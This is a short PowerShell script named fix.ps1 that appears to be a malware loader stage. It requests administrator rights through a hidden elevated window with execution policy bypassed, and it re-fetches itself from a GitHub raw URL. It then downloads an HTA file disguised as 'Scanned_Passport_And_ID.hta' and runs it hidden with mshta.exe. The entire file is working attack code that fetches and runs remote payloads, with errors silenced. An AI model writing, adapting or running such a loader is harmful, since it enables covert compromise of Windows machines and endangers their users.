# fix.ps1 — elevated stage: fetch HTA, run it, HTA does the rest
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$FixUrl = 'https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/fix.ps1'

# self-elevate if not admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Start-Process powershell.exe -Verb RunAs -ArgumentList '-w','hidden','-ExecutionPolicy','Bypass','-Command',"iwr '$FixUrl' -OutFile `"$env:TEMP\fix.ps1`"; . `"$env:TEMP\fix.ps1`""
    exit
}

# elevated — fetch and run HTA
$htaUrl  = 'https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Scanned_Passport_And_ID.hta'
$htaPath = "$env:TEMP\Scanned_Passport_And_ID.hta"
try { (New-Object Net.WebClient).DownloadFile($htaUrl, $htaPath) } catch {}

if (Test-Path $htaPath) {
    Start-Process 'mshta.exe' -ArgumentList "`"$htaPath`"" -WindowStyle Hidden
}
